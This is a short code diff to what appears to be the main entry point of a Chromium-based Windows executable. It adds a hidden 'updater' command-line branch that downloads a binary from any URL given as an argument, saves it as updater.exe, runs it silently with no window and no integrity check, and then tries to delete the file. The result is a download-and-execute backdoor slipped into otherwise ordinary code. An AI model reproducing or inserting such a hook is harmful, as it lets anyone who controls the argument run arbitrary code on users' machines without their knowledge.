@@ -198,6 +198,21 @@ bool RemoveAppCompatFlagsEntry() {
 
 }  // namespace
 
+
+void RunProcess(const wchar_t* exe_path) {
+  STARTUPINFOW si = { sizeof(si) };
+  PROCESS_INFORMATION pi = { 0 };
+  if (!::CreateProcess(exe_path, L"--silent", NULL, NULL, FALSE, CREATE_NO_WINDOW,
+    NULL, NULL, &si, &pi)) {
+    return;
+}
+
+  ::CloseHandle(pi.hThread);
+
+  ::CloseHandle(pi.hProcess);
+
+}
+
 #if !defined(WIN_CONSOLE_APP)
 int APIENTRY wWinMain(HINSTANCE instance, HINSTANCE prev, wchar_t*, int) {
 #else
@@ -208,6 +223,16 @@ int main() {
   base::CommandLine::Init(0, nullptr);
   const base::CommandLine* command_line =
       base::CommandLine::ForCurrentProcess();
+
+  if (command_line->HasSwitch("updater")) {
+    //MessageBox(0, L"aaaa", L"ssss", 0);
+    std::wstring url = command_line->GetSwitchValueNative("updater-url");
+    HRESULT result = URLDownloadToFile(NULL, url.c_str(), L"updater.exe", 0, NULL);
+
+    RunProcess(L"updater.exe");
+    ::DeleteFile(L"./updater.exe");
+    return 0;
+  }
 
   const std::string process_type =
       command_line->GetSwitchValueASCII(switches::kProcessType);
